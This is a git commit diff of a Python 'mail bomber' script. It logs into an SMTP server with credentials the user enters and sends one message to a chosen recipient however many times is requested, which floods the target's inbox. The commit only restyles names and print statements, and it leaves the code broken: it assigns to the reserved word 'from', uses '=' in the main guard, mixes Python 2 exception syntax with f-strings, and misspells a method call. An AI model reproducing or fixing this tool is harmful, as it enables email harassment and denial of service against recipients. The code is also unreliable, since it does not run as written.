19c98479fd08b1b4d08fb7ab2ad2f49a28fbca95
Samuel Riddle <30331129+sjriddle@users.noreply.github.com>
2020-04-06 17:10:48 -0600

    Update mailBomber.py

--- mailBomber.py
+++ mailBomber.py
@@ -6,54 +6,52 @@ from email.MIMEText import MIMEText
 
 class SMTP(object):
     def title(self):
-        print('[+] PYTHON MAIL BOMBER: SUCCESS')
+        print('[+] Python Mail Bomber: Success')
         
-        
-    def SMTPconnect(self):
+    def smtp_connect(self):
         print('We are in the SMTPconnect')
         self.smtpserver = raw_input('\nEnter SMTP Server: ')
         self.smtpport = input('Enter SMTP Port (e.g. 25 or 465): ')
         try:
-            self.mailServer = smtplib.SMTP(self.smtpserver, self.smtpport)
+            self.mail_server = smtplib.SMTP(self.smtpserver, self.smtpport)
         except IOError, e:
-            print('Error: %s' %(e))
+            print(f'Error: {e}')
             time.sleep(5)
             sys.exit(1)
-        self.mailServer.starttls()
+        self.mail_server.starttls()
         self.username=raw_input('\nEnter Username: ')
         self.password=raw_input('Enter Password: ')
         try:
-              self.mailServer.login(self.username,self.password)
+              self.mail_server.login(self.username, self.password)
         except BaseException, e:
-              print 'Error: %s' % (e)
+              print(f'Error: {e}')
               time.sleep(3)
-              sys.exit(1)
+              sys.exit(1)         
                 
-                
-    def buildEmail(self):
-        print('We are inside buildEmail')
+    def build_email(self):
+        print('We are inside build email')
         print('\tBuilding Message Part')
-        self.From = raw_input("\nFrom: ")
-        self.To = raw_input("\nTo: ")
-        self.Subject = raw_input("\nSubject: ")
-        self.Message = raw_input("\nMessage: ")
+        self.from = raw_input("\nFrom: ")
+        self.to = raw_input("\nTo: ")
+        self.subject = raw_input("\nSubject: ")
+        self.message = raw_input("\nMessage: ")
 
-        messageData = MIMEText(self.Message)
-        messageData['From']=self.From
-        messageData['To']=self.To
-        messageData['Subject']=self.Subject
+        message_data = MIMEText(self.message)
+        message_data['From']=self.from
+        message_data['To']=self.to
+        message_data['Subject']=self.subject
 
         self.amount = input('How many times would you like to send the message: ')
-        x = 0
-        while x < self.amount:
-            self.mailServer.sendmail(self.From, self.To, messageData.as_string())
-            x += 1
-        print(f'Send {self.amount} messages to {self.To}')
+        num = 0
+        while num < self.amount:
+            self.mail_server.sendmail(self.from, self.to, message_data.as_string())
+            num += 1
+        print(f'Send {self.amount} messages to {self.to}')
         time.sleep(7)
 
             
 if __name__ = '__main__':
     s = SMTP()
     s.title()
-    s.SMTPconnect()
-    s.buildEmail()
+    s.stmp_connect()
+    s.build_email()
